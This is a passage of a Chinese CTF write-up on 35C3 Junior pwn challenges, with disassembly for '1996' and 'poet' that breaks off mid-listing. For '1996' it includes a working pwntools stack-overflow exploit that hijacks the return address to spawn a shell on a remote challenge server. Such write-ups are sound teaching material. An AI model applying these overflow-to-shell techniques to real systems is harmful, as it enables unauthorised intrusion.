# 35C3 Junior pwn笔记（上）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在被期末预习虐得半死的时候看到35c3的消息就去稍微看看题，结果又被非libc虐哭，在被虐哭后看到还有Junior赛就过去把Junior的pwn题悄咪咪的写了几题,但在做这些题到后面时还是会卡住，所以在这紧张刺激的期末考结束后写一点笔记来记录和复习下，这里先记录下libc非2.27的题目
## 1996
惯例先checksec文件
    ➜  1996 checksec 1996
    [*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/1996/1996'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
因为最近在练看汇编题目稍微看了下程序逻辑也不难所以就直接就看汇编分析了
    Dump of assembler code for function main:
       0x00000000004008cd :    push   rbp
       0x00000000004008ce :    mov    rbp,rsp
       0x00000000004008d1 :    push   rbx
       0x00000000004008d2 :    sub    rsp,0x408
       0x00000000004008d9 :    lea    rsi,[rip+0x188]        # 0x400a68
       0x00000000004008e0 :    lea    rdi,[rip+0x200779]        # 0x601060 
       0x00000000004008e7 :    call   0x400760  >& std::operator >(std::basic_ostream >&, char const*)@plt>
       0x00000000004008ec :    lea    rax,[rbp-0x410]
       0x00000000004008f3 :    mov    rsi,rax
       0x00000000004008f6 :    lea    rdi,[rip+0x200883]        # 0x601180 
       0x00000000004008fd :    call   0x400740  >& std::operator>> >(std::basic_istream >&, char*)@plt>
       0x0000000000400902 :    lea    rax,[rbp-0x410]
       0x0000000000400909 :    mov    rsi,rax
       0x000000000040090c :    lea    rdi,[rip+0x20074d]        # 0x601060 
       0x0000000000400913 :    call   0x400760  >& std::operator >(std::basic_ostream >&, char const*)@plt>
       0x0000000000400918 :    lea    rsi,[rip+0x17a]        # 0x400a99
       0x000000000040091f :    mov    rdi,rax
       0x0000000000400922 :    call   0x400760  >& std::operator >(std::basic_ostream >&, char const*)@plt>
       0x0000000000400927 :    mov    rbx,rax
       0x000000000040092a :    lea    rax,[rbp-0x410]
       0x0000000000400931 :    mov    rdi,rax
       0x0000000000400934 :    call   0x400780 
       0x0000000000400939 :    mov    rsi,rax
       0x000000000040093c :    mov    rdi,rbx
       0x000000000040093f :    call   0x400760  >& std::operator >(std::basic_ostream >&, char const*)@plt>
       0x0000000000400944 :    mov    rdx,rax
       0x0000000000400947 :    mov    rax,QWORD PTR [rip+0x200692]        # 0x600fe0
       0x000000000040094e :    mov    rsi,rax
       0x0000000000400951 :    mov    rdi,rdx
       0x0000000000400954 :    call   0x400770 
       0x0000000000400959 :    mov    eax,0x0
       0x000000000040095e :    add    rsp,0x408
       0x0000000000400965 :    pop    rbx
       0x0000000000400966 :    pop    rbp
       0x0000000000400967 :    ret
    End of assembler dump.
看一下程序的main我们可以知道这里用cin来读取，如果用c来说就相当与gets也就是一个很明显的栈溢出，接着我们看到lea
rax,[rbp-0x410],我们就知道了bufsize=0x410  
到了这里我们基本就随便玩了，因为给了执行/bin/sh的函数所以我们直接溢出劫持执行流到spawn_shell函数
    Dump of assembler code for function _Z11spawn_shellv:
       0x0000000000400897 :    push   rbp
       0x0000000000400898 :    mov    rbp,rsp
       0x000000000040089b :    sub    rsp,0x10
       0x000000000040089f :    lea    rax,[rip+0x1b3]        # 0x400a59
       0x00000000004008a6 :    mov    QWORD PTR [rbp-0x10],rax
       0x00000000004008aa :    mov    QWORD PTR [rbp-0x8],0x0
       0x00000000004008b2 :    lea    rax,[rbp-0x10]
       0x00000000004008b6 :    mov    edx,0x0
       0x00000000004008bb :    mov    rsi,rax
       0x00000000004008be :    lea    rdi,[rip+0x194]        # 0x400a59
       0x00000000004008c5 :    call   0x4007a0 
       0x00000000004008ca :    nop
       0x00000000004008cb :    leave
       0x00000000004008cc :    ret
    End of assembler dump.
或者用其他的栈溢出方法，因为是简单题就不多赘述了，直接放EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import*
    context(os='linux',arch='amd64',log_level='debug')
    #n = process('./1996')
    n = remote('35.207.132.47',22227)
    elf = ELF('./1996')
    sh_addr = 0x0400897
    n.recvuntil('?')
    n.sendline('a'*(0x410+8)+p64(sh_addr))
    n.interactive()
## poet
    ➜  poet checksec poet
    [*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/poet/poet'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
简单的运行下程序看看程序的大致逻辑
    ➜  poet ./poet
    **********************************************************
    * We are searching for the poet of the year 2018.        *
    * Submit your one line poem now to win an amazing prize! *
    **********************************************************
    Enter the poem here:
    > aaaaaaa
    Who is the author of this poem?
    > nepire
    +---------------------------------------------------------------------------+
    THE POEM
    aaaaaaa
    SCORED 0 POINTS.
    SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
    YOU MUST SCORE EXACTLY 1000000 POINTS.
    TRY AGAIN!
    +---------------------------------------------------------------------------+
大致的就是让你写首诗(gou……)然后程序会给你评个分，最终目标是得到1000000分，接着看下大概的汇编
    Dump of assembler code for function main:
       0x000000000040098b :    push   rbx
       0x000000000040098c :    mov    ecx,0x0
       0x0000000000400991 :    mov    edx,0x2
       0x0000000000400996 :    mov    esi,0x0
       0x000000000040099b :    mov    rdi,QWORD PTR [rip+0x2016de]        # 0x602080 
       0x00000000004009a2 :    call   0x400640 
       0x00000000004009a7 :    lea    rdi,[rip+0x292]        # 0x400c40
       0x00000000004009ae :    call   0x400600 
       0x00000000004009b3 :    lea    rbx,[rip+0x2016e6]        # 0x6020a0 
       0x00000000004009ba :    mov    eax,0x0
       0x00000000004009bf :    call   0x400935 
       0x00000000004009c4 :    mov    eax,0x0
       0x00000000004009c9 :    call   0x400965 
       0x00000000004009ce :    mov    eax,0x0
       0x00000000004009d3 :    call   0x4007b7 
       0x00000000004009d8 :    cmp    DWORD PTR [rbx+0x440],0xf4240
       0x00000000004009e2 :    je     0x4009f2 
       0x00000000004009e4 :    lea    rdi,[rip+0x345]        # 0x400d30
       0x00000000004009eb :    call   0x400600 
       0x00000000004009f0 :    jmp    0x4009ba 
       0x00000000004009f2 :    mov    eax,0x0
       0x00000000004009f7 :    call   0x400767 
    End of assembler dump.
main就三个关键逻辑函数(get_poem/get_author/rate_poem)，reward函数就是一个getflag的函数就不细分析了  
先看下get_poem和get_author的代码
    Dump of assembler code for function get_poem:
       0x0000000000400935 :        sub    rsp,0x8
       0x0000000000400939 :        lea    rdi,[rip+0x17b]        # 0x400abb
       0x0000000000400940 :    mov    eax,0x0
       0x0000000000400945 :    call   0x400610 
       0x000000000040094a :    lea    rdi,[rip+0x20174f]     # 0x6020a0 
       0x0000000000400951 :    call   0x400630 
       0x0000000000400956 :    mov    DWORD PTR [rip+0x201b80],0x0        # 0x6024e0 
       0x0000000000400960 :    add    rsp,0x8
       0x0000000000400964 :    ret
    End of assembler dump.
    Dump of assembler code for function get_author:
       0x0000000000400965 :        sub    rsp,0x8
       0x0000000000400969 :        lea    rdi,[rip+0x2a8]     # 0x400c18
       0x0000000000400970 :    mov    eax,0x0
       0x0000000000400975 :    call   0x400610 
       0x000000000040097a :    lea    rdi,[rip+0x201b1f]  # 0x6024a0 
       0x0000000000400981 :    call   0x400630 